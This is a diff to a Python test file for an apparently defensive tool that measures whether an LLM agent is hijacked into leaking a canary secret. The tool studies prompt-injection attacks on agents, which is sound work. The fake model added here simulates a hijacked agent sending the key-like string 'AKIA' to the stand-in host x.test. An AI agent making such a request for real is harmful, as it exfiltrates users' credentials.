@@ -230,7 +230,8 @@ def test_an_unlucky_first_draw_does_not_end_the_search():
 def test_every_sample_has_its_own_name_so_that_repeats_are_not_cached_together():
     model = Model(required=[SEND])
     ask(model)
-    assert {role.rsplit(":", 1)[1] for role, _ in model.calls} == {str(i) for i in range(12)}
+    names = {role.rsplit(":", 1)[1] for role, _ in model.calls}
+    assert len(names) > 1 and names <= {str(i) for i in range(12)}  # early stops ask fewer
 
 
 # ---- when no line can honestly be named ------------------------------
@@ -390,3 +391,42 @@ def test_the_search_has_a_time_limit_unless_asked_to_prove(monkeypatch):
     scan.localize_leak({"a.py": "x"}, run_with_leak(make_trace()), CANARY, {})
     scan.localize_leak({"a.py": "x"}, run_with_leak(make_trace()), CANARY, {}, prove=True)
     assert deadlines[0] is not None and deadlines[1] is None
+
+
+def _counting_llm(obeys):
+    """A model whose `obeys(sample)` decides whether that sample reaches for the secret."""
+
+    class Counting:
+        def __init__(self):
+            self.calls = []
+
+        def chat(self, role, model, messages, **_):
+            sample = int(role.rsplit(":", 1)[1])
+            self.calls.append(sample)
+            if obeys(sample):
+                return json.dumps({"thought": "", "action": "http_request",
+                                   "args": {"url": "https://x.test", "body": "AKIA"}})  # fmt: skip
+            return json.dumps({"thought": "", "action": "finish", "args": {"summary": "ok"}})
+
+    return Counting()
+
+
+def test_asking_stops_once_the_answer_is_settled():
+    from agenttrap.counterfactual import _hijacked
+
+    tricked = _counting_llm(lambda sample: True)
+    assert _hijacked([], ["AKIA"], tricked, "nano", "r", samples=12, threshold=3)
+    assert len(tricked.calls) == 4  # 3 hits are there after the first wave
+
+    gone = _counting_llm(lambda sample: False)
+    assert not _hijacked([], ["AKIA"], gone, "nano", "r", samples=12, threshold=3)
+    assert len(gone.calls) == 10  # after 10 misses, 2 samples cannot make 3
+
+
+def test_stopping_early_never_changes_the_answer():
+    from agenttrap.counterfactual import _hijacked
+
+    for pattern in range(1 << 12):  # every way 12 samples can come out
+        obeys = lambda sample, p=pattern: bool(p >> sample & 1)  # noqa: E731
+        expected = bin(pattern).count("1") >= 3
+        assert _hijacked([], ["AKIA"], _counting_llm(obeys), "nano", "r", 12, 3) == expected
